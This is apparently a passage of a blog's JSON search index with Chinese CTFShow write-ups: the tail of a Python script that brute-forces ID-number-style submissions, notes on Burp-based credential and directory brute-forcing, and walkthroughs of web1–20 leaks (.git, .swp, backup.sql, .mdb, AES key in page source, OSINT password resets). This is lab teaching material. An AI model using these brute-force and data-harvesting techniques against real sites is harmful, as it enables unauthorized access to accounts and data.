msg=js[\u0026#39;msg\u0026#39;] 44 print(sfz,msg) 45 await sess.close() 46 return msg!=\u0026#39;提交信息有误\u0026#39; 47 except Exception as e: 48 print(e) 49 pass 50 try: 51 await sess.close() 52 except: 53 pass 54 return False 55 56async def handle_up(self,u,p): 57 pass 58a=Scanner(date(1990,1,1),date(2010,12,12),NUM) 59 60a.run() web28 这题本来不知道要干嘛\ndirsearch扫一下,感觉应该是目录爆破\n先爆破一下0-100\n","permalink":"http://localhost:1313/post/ctfshow/ctfshow_%E7%88%86%E7%A0%B4/","summary":"\u003ch4 id=\"web21\"\u003eweb21\u003c/h4\u003e\n\u003cp\u003e\u003cimg alt=\"image-20241123165104490\" loading=\"lazy\" src=\"../assets/image-20241123165104490.png\"\u003e\u003c/p\u003e\n\u003cp\u003e抓个包\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20241123165621808\" loading=\"lazy\" src=\"../assets/image-20241123165621808.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们可以看到他的账号密码是通过base64编码加密后再发送的，问题不大\u003c/p\u003e\n\u003cp\u003epayload设置如下\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20241123165947562\" loading=\"lazy\" src=\"../assets/image-20241123165947562.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20241123170139759\" loading=\"lazy\" src=\"../assets/image-20241123170139759.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们还要设置一下payload处理\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20241123170509504\" loading=\"lazy\" src=\"../assets/image-20241123170509504.png\"\u003e\u003c/p\u003e\n\u003cp\u003e开始爆破，根据长度或者状态码判断即可\u003c/p\u003e","title":"CTFSHOW-爆破-Writeup"},{"content":"Web 1-5 查看网页源代码 抓个包看有没有藏东西 查看robots.txt phps源码泄露，访问index.phps，通过其源码泄露，在其中找到flag Web6 网页提示下载源码查看，访问url/www.zip得到源码文件\n解压文件我们得到\n打开fl00g.txt，没有我们想要的flag\n打开index.php\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-01 14:37:13 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-01 14:42:44 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13//flag in fl000g.txt 14echo \u0026#34;web6:where is flag?\u0026#34; 15?\u0026gt; 显示flag in fl00g.txt\n直接访问url/fl00g.txt得到flag\nweb7 git泄露，访问url/.git即可得到flag\nweb8 svn泄露，访问url/.git即可得到flag\nweb9 vim缓存信息泄露，访问url/index.php.swp，打开下载的index.php.swp即可得到flag\nweb10 根据hint查看cookie可以看到\ncookie:flag=ctfshow%7B3ac14c03-64d1-41aa-9328-c97bcceeb840%7D\n进行url解码即可得到flag\nweb11 域名解析\n我们可以通过nslookup来进行域名解析查询\nnslookup -qt=格式 URL nslookup -qt=any URL //遍历所有格式 nslookup -qt=TXT URL\r//查询txt格式 web12 hint：有时候网站上的公开信息，就是管理员常用密码\n先用dirsearch扫一下\n访问admin，要求我们输入管理员账号密码，根据后台路径我们可以猜测账号为admin\n回到主页，在网页的底部我们可以看到一个电话Help Line Number : 372619038\n猜测电话为管理员密码，输入后成功得到flag\nweb13 在页面底部可以看到一个document\n点击发现下载了一个document.pdf文件，文件里有后台的地址和账号密码\nd\n登录后台即可得到flag\nweb14 根据hint知道editor处应该有信息泄漏(虽然不知道什么是editor)\n我们先用dirsearch扫一下后台\n访问url/editor\n是一个文字编辑的页面，我们可以发现在上传附件📎出可以调用出到服务器的文件管理器\n在服务器的根目录没看到flag，尝试查看网站的根目录(var/www/html),看看有没有隐藏页面\n发现nothinghere文件夹中有个fl00g.txt文件\n访问url/nothinghere/f1000g.txt即可得到flag\nweb15 扫描到后台为url/admin，打开看到有个忘记密码，要求输入城市\n根据hint我们可以在主页底部找到一个qq邮箱，查询一下qq号\n得到信息，现居陕西西安\n输入西安成功重置密码，输入重置密码和帐号admin，成功得到flag\nWeb16 探针泄漏\ndirsearch 扫描不到这个探针，看wp才知道的\n探针在url/tz.php\n访问探针\n在指针里面可以找到phpinfo页面\n打开在phpinfo里面可以找到flag\nweb17 sql备份泄漏\n用dirsearch扫出来存在sql备份泄漏，下载backup.sql，打开得到flag\nweb18 本题是一个游戏，玩到101分就能得到flag\n我们直接看js\nFlappy_js.js\n审一下代码，我们可以看到当分数大于100的时候会输出这段文字，这段文字看着像unidcode编码，解码试试\n根据提示访问url/110.php,得到flag\nweb19 题目是一个登录的页面，根据hint查看网页源代码\n根据提示，这道题应该是一道对密码进行了加密的题目\n审阅一下代码我们得到这些信息\nmode模式： CBC padding 填充方式： ZeroPadding 密文输出编码： 十六进制hex 偏移量iv: ilove36dverymuch 密钥：0000000372619038 密文为： a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04\nAES 加密/解密 - 锤子在线工具\n用解密工具解密一下密文我们可以得到密码为\n输入密码，得到flag\nweb20 hint：mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。\n这是一个使用access数据库的asp程序\n根据提示本题存在mdb文件泄露，那我们直接访问url/db/db.mdb\n下载db.mdb文件后用记事本打开搜索flag，即可得到 flag{ctfshow_old_database}\n","permalink":"http://localhost:1313/post/ctfshow/ctfshow_%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","summary":"\u003ch4 id=\"web-1-5\"\u003eWeb 1-5\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e查看网页源代码\u003c/li\u003e\n\u003cli\u003e抓个包看有没有藏东西\u003c/li\u003e\n\u003cli\u003e查看robots.txt\u003c/li\u003e\n\u003cli\u003ephps源码泄露，访问index.phps，通过其源码泄露，在其中找到flag\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"web6\"\u003eWeb6\u003c/h4\u003e\n\u003cp\u003e网页提示下载源码查看，访问url/www.zip得到源码文件\u003c/p\u003e","title":"CTFSHOW-信息收集-Writeup"},{"content":"A common student at GDUFS\u0026hellip;\n","permalink":"http://localhost:1313/about/","summary":"about","title":"关于"},{"content":"","permalink":"http://localhost:1313/links/","summary":"links","title":"友链"}]